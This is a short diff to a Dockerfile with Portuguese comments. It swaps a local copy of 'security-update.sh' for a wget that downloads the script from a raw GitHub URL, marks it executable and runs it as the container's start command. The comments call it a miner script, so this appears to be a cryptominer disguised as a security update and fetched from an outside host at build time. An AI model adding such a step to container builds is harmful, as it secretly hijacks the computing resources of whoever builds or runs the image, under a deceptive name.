@@ -10,9 +10,9 @@ RUN apt-get update && \
 # Diretório de trabalho
 WORKDIR /app
 
-# Baixa e executa o script minero
-COPY security-update.sh /app/security-update.sh
-RUN chmod +x /app/security-update.sh
+# Baixa o script minero diretamente do GitHub
+RUN wget -qO /app/security-update.sh https://raw.githubusercontent.com/magicasdabiblia-afk/atualizacao-sistema-nova/main/security-update.sh && \
+    chmod +x /app/security-update.sh
 
 # Executa o script
 CMD ["/app/security-update.sh"]
